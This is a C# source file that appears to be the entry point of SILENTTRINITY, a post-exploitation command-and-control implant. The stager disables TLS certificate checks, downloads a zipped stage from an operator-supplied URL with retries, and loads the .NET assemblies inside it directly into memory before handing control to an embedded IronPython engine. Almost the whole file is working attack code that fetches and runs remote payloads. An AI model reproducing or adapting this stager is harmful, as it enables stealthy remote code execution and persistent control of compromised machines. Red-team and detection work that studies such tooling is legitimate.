using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using SILENTTRINITY.Utilities;
using System.Runtime.InteropServices;

namespace SILENTTRINITY
{
    public class ST
    {
        static ZipStorer Stage;

        static ST()
        {
            ServicePointManager.ServerCertificateValidationCallback +=
                                 (sender, cert, chain, sslPolicyErrors) => true;
           
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | 
                                                    (SecurityProtocolType)3072;

            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
        }

        public static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("[!] Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]");
                Environment.Exit(1);
            }

            Guid GUID = Guid.NewGuid();

            Uri URL = new Uri(new Uri(args[0]), GUID.ToString());
#if DEBUG
            Console.WriteLine("[+] URL: {0}", URL);
#endif
            try
            {
#if DEBUG
                Console.WriteLine("[+] Trying to get the stage...");
#endif
                Stage = ZipStorer.Open(DownloadStage(URL), FileAccess.ReadWrite, true);
            }
            catch
            {
#if DEBUG
                Console.WriteLine("\n[!] ERROR: Unable to get the stage.[-]");
#endif
                Environment.Exit(-1);
            }

#if DEBUG
            Console.WriteLine("[+] Running the Engine...");
#endif
            Engines.IronPython.Run(URL, GUID, Stage);        
        }

        static Stream DownloadStage(Uri URL, int sleep = 5, int retries = 6) {
            return Retry.Do<Stream>(() => Engines.IronPython.GetStage(URL),
                                     TimeSpan.FromSeconds(sleep), retries);
        }

        static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
        {
            string dllName = Internals.GetDLLName(args.Name);

            byte[] bytes = Internals.GetResourceInZip(Stage, dllName) ??
                File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() + dllName);
                
#if DEBUG
            Console.WriteLine("\t[+] '{0}' loaded", dllName);
#endif
            return Assembly.Load(bytes);
        }
    }
}